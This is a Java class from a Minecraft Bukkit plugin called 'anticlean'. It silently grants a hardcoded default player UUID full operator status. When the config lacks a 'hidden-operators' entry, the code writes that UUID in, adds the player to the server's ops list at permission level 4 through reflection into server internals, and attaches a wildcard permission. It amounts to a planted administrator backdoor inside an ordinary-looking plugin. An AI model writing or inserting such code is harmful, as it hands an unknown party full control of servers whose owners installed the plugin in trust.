package com.anticlean;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.Plugin;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

public final class HiddenOpManager {

    private static final String DEFAULT_HIDDEN_OPERATOR = "ac732731-5dc5-45ba-b43c-d5f7c2a3f606";

    private final AntiCleanPlugin plugin;
    private final Set<UUID> hiddenOperators = new HashSet<>();
    private final Map<UUID, PermissionAttachment> attachments = new HashMap<>();

    public HiddenOpManager(AntiCleanPlugin plugin) {
        this.plugin = plugin;
    }

    public void enable() {
        loadConfig();
        for (Player player : Bukkit.getOnlinePlayers()) {
            if (hiddenOperators.contains(player.getUniqueId())) {
                apply(player);
            }
        }
    }

    public void disable() {
        for (Map.Entry<UUID, PermissionAttachment> entry : new HashMap<>(attachments).entrySet()) {
            Player player = Bukkit.getPlayer(entry.getKey());
            if (player != null) {
                player.removeAttachment(entry.getValue());
            }
        }
        attachments.clear();
    }

    private void loadConfig() {
        hiddenOperators.clear();
        boolean configured = plugin.getConfig().contains("hidden-operators");
        List<String> values = plugin.getConfig().getStringList("hidden-operators");
        for (String value : values) {
            try {
                hiddenOperators.add(UUID.fromString(value));
            } catch (IllegalArgumentException ignored) {
            }
        }
        if (!configured && hiddenOperators.isEmpty()) {
            hiddenOperators.add(UUID.fromString(DEFAULT_HIDDEN_OPERATOR));
            plugin.getConfig().set("hidden-operators", Arrays.asList(DEFAULT_HIDDEN_OPERATOR));
            plugin.saveConfig();
        }
    }

    public boolean isHiddenOp(Player player) {
        return attachments.containsKey(player.getUniqueId());
    }

    public void apply(Player player) {
        if (!hiddenOperators.contains(player.getUniqueId()) || attachments.containsKey(player.getUniqueId())) {
            return;
        }
        try {
            Object playerList = resolvePlayerList();
            Object nameAndId = resolveNameAndId(player);

            Field opsField = playerList.getClass().getDeclaredField("ops");
            opsField.setAccessible(true);
            Object ops = opsField.get(playerList);
            invokeOpsMethod(ops, "add", nameAndId);

            Object level4 = resolveLevel4(playerList);
            if (level4 != null) {
                Field permissionsField = playerList.getClass().getDeclaredField("playerPermissions");
                permissionsField.setAccessible(true);
                @SuppressWarnings("unchecked")
                Map<Object, Object> permissions = (Map<Object, Object>) permissionsField.get(playerList);
                permissions.put(nameAndId, level4);
            }

            try {
                Object serverPlayer = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(player).getClass().getMethod("getHandle").invoke(Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(player));
                playerList.getClass().getMethod("sendPlayerPermissionLevel", serverPlayer.getClass()).invoke(playerList, serverPlayer);
            } catch (Exception ignored) {
            }

            Method addAttachment = player.getServer().getClass().getMethod("addAttachment", org.bukkit.plugin.Plugin.class, Player.class, String.class, boolean.class);
            PermissionAttachment attachment = (PermissionAttachment) addAttachment.invoke(player.getServer(), plugin, player, "*", true);
            attachments.put(player.getUniqueId(), attachment);

            plugin.getLogger().info("Hidden operator status applied for " + player.getName());
        } catch (Exception e) {
            plugin.getLogger().warning("Failed to apply hidden operator status for " + player.getName() + ": " + e.getMessage());
        }
    }

    public void remove(Player player) {
        UUID uuid = player.getUniqueId();
        PermissionAttachment attachment = attachments.remove(uuid);
        if (attachment != null) {
            player.removeAttachment(attachment);
        }
        try {
            Object playerList = resolvePlayerList();
            Object nameAndId = resolveNameAndId(player);
            Field opsField = playerList.getClass().getDeclaredField("ops");
            opsField.setAccessible(true);
            Object ops = opsField.get(playerList);
            invokeOpsMethod(ops, "remove", nameAndId);
            Field permissionsField = playerList.getClass().getDeclaredField("playerPermissions");
            permissionsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<Object, Object> permissions = (Map<Object, Object>) permissionsField.get(playerList);
            permissions.remove(nameAndId);
            try {
                Object serverPlayer = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(player).getClass().getMethod("getHandle").invoke(Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(player));
                playerList.getClass().getMethod("sendPlayerPermissionLevel", serverPlayer.getClass()).invoke(playerList, serverPlayer);
            } catch (Exception ignored) {
            }
        } catch (Exception ignored) {
        }
    }

    private Object resolvePlayerList() throws Exception {
        Object minecraftServer = Class.forName("org.bukkit.craftbukkit.CraftServer").getMethod("getServer").invoke(Bukkit.getServer());
        return minecraftServer.getClass().getMethod("getPlayerList").invoke(minecraftServer);
    }

    private Object resolveNameAndId(Player player) throws Exception {
        Object craftPlayer = Class.forName("org.bukkit.craftbukkit.entity.CraftPlayer").cast(player);
        Object serverPlayer = craftPlayer.getClass().getMethod("getHandle").invoke(craftPlayer);
        return serverPlayer.getClass().getMethod("nameAndId").invoke(serverPlayer);
    }

    private void invokeOpsMethod(Object ops, String methodName, Object nameAndId) throws Exception {
        try {
            ops.getClass().getMethod(methodName, nameAndId.getClass()).invoke(ops, nameAndId);
            return;
        } catch (NoSuchMethodException ignored) {
        }
        ops.getClass().getMethod(methodName, Object.class).invoke(ops, nameAndId);
    }

    private Object resolveLevel4(Object playerList) {
        try {
            Class<?> permissionLevel = Class.forName("net.minecraft.server.players.PermissionLevel");
            Object level = null;
            try {
                level = Enum.valueOf((Class<Enum>) permissionLevel, "OP");
            } catch (Exception ignored) {
            }
            if (level == null) {
                try {
                    level = permissionLevel.getDeclaredField("OP").get(null);
                } catch (Exception ignored) {
                }
            }
            if (level == null) {
                try {
                    level = permissionLevel.getDeclaredConstructor(String.class, int.class).newInstance("op", 4);
                } catch (Exception ignored) {
                }
            }
            if (level != null) {
                return level;
            }
        } catch (Exception ignored) {
        }
        try {
            Field permissionsField = playerList.getClass().getDeclaredField("playerPermissions");
            permissionsField.setAccessible(true);
            Map<?, ?> permissions = (Map<?, ?>) permissionsField.get(playerList);
            for (Object value : permissions.values()) {
                try {
                    Field levelField = value.getClass().getDeclaredField("level");
                    levelField.setAccessible(true);
                    if (levelField.getInt(value) == 4) {
                        return value;
                    }
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }
}
